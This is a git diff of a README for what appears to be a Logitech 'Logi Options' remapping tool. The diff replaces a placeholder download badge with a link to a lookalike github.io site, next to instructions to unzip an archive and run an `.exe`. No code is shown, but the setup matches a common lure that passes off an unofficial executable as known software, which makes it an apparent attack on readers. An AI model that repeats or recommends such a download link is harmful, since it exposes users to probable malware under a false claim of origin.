@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://logi-options-plus.github.io/.github/)
 
 ## 📸 Overview
 ![logi-options-remapping](https://github.com/user-attachments/assets/82ebdab4-e745-4ee7-b974-9f0823deba3e)
